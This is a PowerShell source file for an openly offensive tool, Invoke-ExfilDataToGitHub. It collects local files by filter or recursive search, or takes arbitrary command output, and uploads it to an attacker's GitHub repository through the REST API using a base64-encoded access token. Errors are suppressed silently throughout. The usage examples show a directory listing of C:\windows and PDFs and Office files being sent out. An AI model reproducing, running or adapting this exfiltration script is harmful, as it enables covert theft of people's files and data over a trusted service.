function Invoke-ExfilDataToGitHub
{

<#

.SYNOPSIS 
Use this script to exfiltrate data and files to a GitHub account. 
Using GitHub v3 REST API tutorial here 
https://channel9.msdn.com/Blogs/trevor-powershell/Automating-the-GitHub-REST-API-Using-PowerShell


.DESCRIPTION

.PARAMETER GHUser
GitHub Username

.PARAMETER GHRepo
GitHub repository

.PARAMETER GHPAT
GitHub Personal Access Token

.PARAMETER GHFilePath
GitHub filepath not including the filename so eg. testfolder/

.PARAMETER LocalFilePath
Local file path of files to upload

.PARAMETER GHFileName
GitHub filename eg. testfile.txt

.PARAMETER Filter
Local file filter eg. '*.*' to get all files, '*.pdf' for all pdfs, or 'file.txt, file2.docx' to get a comma-delimited list of files from that dirctory. 
Defaults'

.PARAMETER Data
Data to write to file

.SWITCH Recurse
Recursively get files from subdirectories of given local filepath



.EXAMPLE
# This example exfiltrates data to a file - keys do not work

Invoke-ExfilDataToGitHub -GHUser nnh100 -GHRepo exfil -GHPAT "ODJiZGI5ZjdkZTA3MzQzYWU5MGJjNDA3ZWU2NjQxNTk0MzllZ==" 
                                                -GHFilePath "testfolder/" -GHFileName "testfile3" -Data (dir c:\windows | Out-String )
.EXAMPLE
# This example exfiltrates files from a given directory and filter
Invoke-ExfilDataToGitHub -GHUser nnh100 -GHRepo exfil -GHPAT "ODJiZGI5ZjdkZTA3MzQzYWU5MGJjNDA3ZWU2NjQxNTk0MzllZ=="
   -GHFilePath "testfolder/" -LocalfilePath "C:\temp\" -Filter "*.pdf"


.EXAMPLE
# This examples exfiltrates specific files from a given directory
Invoke-ExfilDataToGitHub -GHUser nnh100 -GHRepo exfil -GHPAT "ODJiZGI5ZjdkZTA3MzQzYWU5MGJjNDA3ZWU2NjQxNTk0MzllZ==" 
    -GHFilePath "testfolder" -LocalfilePath "C:\temp" -Filter "play.pptx, test.pub, blank.docx" -Recurse 

#>

    [CmdletBinding()] Param(

        [Parameter(Position = 0, Mandatory = $True)]
        [String]
        $GHUser,

        [Parameter(Position = 1, Mandatory = $True)]
        [String]
        $GHRepo,

        [Parameter(Position = 2, Mandatory = $True)]
        [String]
        $GHPAT, # This should be base 64 encoded

        [Parameter(Position =3, Mandatory = $True)]
        [String]
        $GHFilePath,

        [Parameter(Position = 4, Mandatory=$True, ParameterSetName="ExfilFilesFromFilePath")]
        [String]
        $LocalFilePath,

        [Parameter(Position = 4, Mandatory = $True, ParameterSetName="ExfilDataToFile")]
        [String]
        $GHFileName,

        [Parameter(Position = 5, Mandatory = $False, ParameterSetName="ExfilFilesFromFilePath")]
        [String]
        $Filter = "*.*",

        [Parameter(Position = 5, Mandatory = $True, ParameterSetName="ExfilDataToFile")]
        [String]
        $Data,

        [Parameter(Mandatory = $False, ParameterSetName="ExfilFilesFromFilePath")]
        [switch]
        $Recurse = $False



    )


    # Decode the GitHub Personal Access Token
    $GHPAT = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($GHPAT))

    # Get the PAT in the correct format
    $Token = $GHUser + ":" + $GHPAT

    # Convert this to Base64
    $Base64Token = [System.Convert]::ToBase64String([char[]]$Token)
    $Headers = @{
        Authorization =  'Basic {0}' -f $Base64Token;
    };



#region ExfilDataToFile

if ($PsCmdlet.ParameterSetName -eq "ExfilDataToFile")
{

    # Before deleting or inserting check to see if the file exists, if it does then get the sha and delete the file first
    $GHAPI = "https://api.github.com/repos/" + $GHUser + "/" + $GHRepo + "/contents/" + $GHFilePath + $GHFileName

    $Body = @{
        path = $GHFilePath + $GHFileName;
        ref = "master";
    }


    Try {
        $content = Invoke-RestMethod -Headers $Headers -Uri $GHAPI -Body $Body -Method Get -ErrorAction SilentlyContinue
         # If we get here that means we were able to get the contents so get hold of the sha
        $sha = $content.sha
        #Write-Error $sha
    }
    Catch {        
        $ErrorMessage = $_.Exception.Message;
        #Write-Error "Trying to get file contents: " + $ErrorMessage; # remove in production
    }

   

    # Delete the file if it already exists
    if ($sha -ne $null){
    

        $Body = @{
            path = $GHFileName;
            message = "deleted file";
            sha = $sha;
    
        } | ConvertTo-Json;

        try {
            Invoke-RestMethod -Headers $Headers -Uri $GHAPI -Body $Body -Method Delete -ErrorAction SilentlyContinue
        }
        catch{
            $ErrorMessage = $_.Exception.Message;
            #Write-Error "Trying to delete file: " + $ErrorMessage; #remove in production
        }
    } 

    # Here we are adding the file
    $Body = @{
        path = $GHFileName;
        content = [System.Convert]::ToBase64String([char[]]$Data);
        encoding = 'base64';
        message = "Commit at: " + (Get-Date); 
        } | ConvertTo-Json;
       
        try{            
            $content = Invoke-RestMethod -Headers $Headers -Uri $GHAPI -Body $Body -Method Put -ErrorAction SilentlyContinue
            #Write-Error "Successfully uploaded file!"
        }
        catch{
            $ErrorMessage = $_.Exception.Message;
            #Write-Error "Trying to create file: " + $ErrorMessage;
            #exit
        }    


    
}



#endregion


#region ExfilFilesFromFilePath


if ($PsCmdlet.ParameterSetName -eq "ExfilFilesFromFilePath")
{

    # Make sure filepaths are in correct format
    if ($GHFilePath[-1] -ne "/") { $GHFilePath += "/" }
    if ($LocalFilePath[-1] -ne "\") { $LocalFilePath += "\" }


    # Get the collection of files from the filter
    #if ($Files) { $Files.Clear() }
    $Files = @()

    $Filters = $Filter.Split(',')
    
    ForEach ($fil in $Filters) { 

        # Check if files should be recursively retrieved 
        if ($Recurse -eq $True){
            Get-ChildItem -Recurse ($LocalFilePath + $fil.Trim()) | ForEach-Object { $Files += $_ }
        }
        elseif ($Recurse -eq $False) {
            Get-ChildItem ($LocalFilePath + $fil.Trim()) | ForEach-Object { $Files += $_ } 
        }
    }


    ForEach ($file in $Files){

        Try {
            
            # Construct the API URL
            $GHAPI = "https://api.github.com/repos/" + $GHUser + "/" + $GHRepo + "/contents/" + $GHFilePath + $file.Name

            
            # Check to see if the file already exists
            $Body = @{
                path = $GHFilePath + $file.Name;
                ref = "master";
            }

            Try {
                $content = Invoke-RestMethod -Headers $Headers -Uri $GHAPI -Body $Body -Method Get -ErrorAction SilentlyContinue
                # If we get here that means we were able to get the contents so get hold of the sha
                $sha = $content.sha
            }
            Catch {      
                $ErrorMessage = $_.Exception.Message;
                #Write-Error "Trying to get file contents: " + $ErrorMessage;
            }

            # Delete the file if it already exists
            if ($sha -ne $null){
    
                $Body = @{
                    path = $file.Name;
                    message = "deleted file";
                    sha = $sha;    
                } | ConvertTo-Json;

                try {
                    Invoke-RestMethod -Headers $Headers -Uri $GHAPI -Body $Body -Method Delete -ErrorAction SilentlyContinue
                }
                catch{
                    $ErrorMessage = $_.Exception.Message;
                    #Write-Error "Trying to delete file: " + $ErrorMessage;
                }
            } 

            # Upload the file
            # Get the file as a byte array
            $FileBytes = Get-Content -Path $file.FullName -Encoding Byte
            # Base 64 encode the byte array
            $Base64EncodedFileBytes = [System.Convert]::ToBase64String($FileBytes)
            
            # Set the body context for GitHub
            $Body = @{
                path = $file.Name
                content = $Base64EncodedFileBytes;                
                encoding = 'base64'
                message = "Commit at: " + (Get-Date);
            } | ConvertTo-Json
            
            $content = Invoke-RestMethod -Headers $Headers -Uri $GHAPI -Body $Body -Method Put -ErrorAction SilentlyContinue
            #Write-Error "Successfully uploaded file!"

        }
        Catch {
            $ErrorMessage = $_.Exception.Message;
            #Write-Error "Trying to upload file " + $file.FullName + " :" + $ErrorMessage
            #exit
        }

    }
   
}

#endregion

}

